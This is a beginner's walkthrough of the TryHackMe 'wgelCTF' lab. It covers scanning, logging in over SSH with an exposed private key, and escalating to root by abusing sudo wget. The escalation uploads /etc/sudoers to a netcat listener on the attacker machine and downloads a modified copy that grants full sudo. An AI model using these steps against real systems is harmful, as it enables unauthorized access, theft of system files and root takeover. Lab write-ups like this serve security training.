<a href="https://tryhackme.com/room/wgelctf"><img src="../images/THMlogo.png" alt="tryhackme" width="200"/></a>

# wgelCTF
A new room for beginners, of which I am one.... created by [MrSeth6797](https://tryhackme.com/p/MrSeth6797)
## nmap
Initial
```
~/CTF/tryhackme/wgelCTF$ nmap -A -sC -sV -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 06:55 BST
Nmap scan report for 10.10.15.115
Host is up (0.019s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.87 seconds

```
So only two ports highlighted here. Both standard as SSH ad HTTP.

All Ports
```
nmap -p- -oN nmap/all_ports $IP 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 06:56 BST
Nmap scan report for 10.10.15.115
Host is up (0.018s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.41 seconds

```

## gobuster

### initial
```
~/CTF/tryhackme/wgelCTF$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.15.115
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/21 07:28:09 Starting gobuster
===============================================================
/sitemap (Status: 301)
/server-status (Status: 403)
===============================================================
2020/08/21 07:36:34 Finished
===============================================================
```
### secondary - sitemap.
```
~/CTF/tryhackme/wgelCTF$ gobuster dir -u http://$IP/sitemap -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.15.115/sitemap
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/21 08:40:39 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.ssh (Status: 301)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
===============================================================
2020/08/21 08:41:01 Finished
===============================================================

```
So it looks like we have a possible key at .ssh - id_rsa.

## nikto

```
~/CTF/tryhackme/wgelCTF$ nikto -h $IP
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.15.115
+ Target Hostname:    10.10.15.115
+ Target Port:        80
+ Start Time:         2020-08-21 07:29:24 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2c6e, size: 595ca55640d0c, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2020-08-21 07:33:05 (GMT1) (221 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
Nothing much here to look at.

## webpage discovery

```
<!-- Jessie don't forget to udate the webiste -->
```
Ohh!! we now have a possible username which we can try with the id_rsa t ssh.

## ssh

### john the ripper

I did try to see if there was a password that JtR could help provide but no luck.
```
~/CTF/tryhackme/wgelCTF$ python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
id_rsa has no password!

```
So onwards and upwards! Lets continue with SSH.

```
~/CTF/tryhackme/wgelCTF$ ssh -i id_rsa jessie@$IP
load pubkey "id_rsa": invalid format
The authenticity of host '10.10.15.115 (10.10.15.115)' can't be established.
ECDSA key fingerprint is SHA256:9XK3sKxz9xdPKOayx6kqd2PbTDDfGxj9K9aed2YtF0A.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.15.115' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$ ls
Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos
jessie@CorpOne:~$ cd Documents/
jessie@CorpOne:~/Documents$ ls
user_flag.txt
jessie@CorpOne:~/Documents$ cat user_flag.txt 
<insert-flag-here> **[Task1 #1]**

```
We are in, and a quick search in the usual places gets us the user flag. Lets check out user jessie's permissions with a sudo -l

```
jessie@CorpOne:~/Documents$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget

```
So a quick look at GTFObins provides us with an oportunity to send and receive files with wget. Lets amend the actual sudoers file to give us access to all.

Before we send we need to be able to receive it. Lets set up netcat on port 1234 on our machine. 
```
~/CTF/tryhackme/wgelCTF$ nc -lnvp 1234
listening on [any] 1234 ...
```
Now we can post our file from the target.

```
jessie@CorpOne:~/Documents$ sudo wget --post-file=/etc/sudoers 10.9.12.213:1234
--2020-08-21 11:31:11--  http://10.9.12.213:1234/
Connecting to 10.9.12.213:1234... connected.
HTTP request sent, awaiting response... No data received.
Retrying.

--2020-08-21 11:32:21--  (try: 2)  http://10.9.12.213:1234/
Connecting to 10.9.12.213:1234... failed: Connection refused.
```
Now we receive the file on the netcat. 
```
connect to [10.9.12.213] from (UNKNOWN) [10.10.15.115] 36246
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.9.12.213:1234
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 797

#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults	env_reset
Defaults	mail_badpass
Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root	ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
jessie	ALL=(root) NOPASSWD: /usr/bin/wget
```
We already know what Jessie can do, we just need to amend it using nano (jessie	ALL=(root) NOPASSWD: ALL) and get it back to it's original location. Now all we have to do is get the amended file to the target to upgrade Jessie's account. In order to do this, we need an http server to actually get the file from. Luckily python can do this for us from our own machine, running an http server from the folder we run the actual command from.
```
~/CTF/tryhackme/wgelCTF$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now back to the target, we wget that file back to its original place and with Jessie using wget as root, we will have no problems. Changing directory to /etc before I wget the file.
```
jessie@CorpOne:~/Documents$ cd /etc
jessie@CorpOne:/etc$ sudo wget 10.9.12.213:8000/sudoers --output-document=sudoers
--2020-08-21 11:33:10--  http://10.9.12.213:8000/sudoers
Connecting to 10.9.12.213:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 815 [application/octet-stream]
Saving to: ‘sudoers’

sudoers                      100%[============================================>]     815  --.-KB/s    in 0,002s  

2020-08-21 11:33:10 (348 KB/s) - ‘sudoers’ saved [815/815]
```
If we now check with sudo - l, we can see the amendments made to Jessie's account.
```
jessie@CorpOne:/etc$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: ALL
```

In this case I just opened a bash shell with sudo and went searching for the root flag.
```
jessie@CorpOne:~$ sudo /bin/bash
root@CorpOne:~# cd /root
root@CorpOne:/root# ls
root_flag.txt
root@CorpOne:/root# cat root_flag.txt 
<insert-flag-here> **[Task1 #2]**
root@CorpOne:/root# 
```

This was a really enjoyable room, where I learnt that I should mix and match my gobuster wordfiles. For the past few months I have been using the dirbuster medium text file, but here after finding nothing and trying to hydra Jessie's SSH account with rockyou.txt made me look elsewhere. The /usr/share/wordlists/dirb/common.txt is now another tool in my armoury.

Thanks go to MrSeth6797 for this room. Much appreciated.

Regards

K

<script src="https://tryhackme.com/badge/65208"></script>
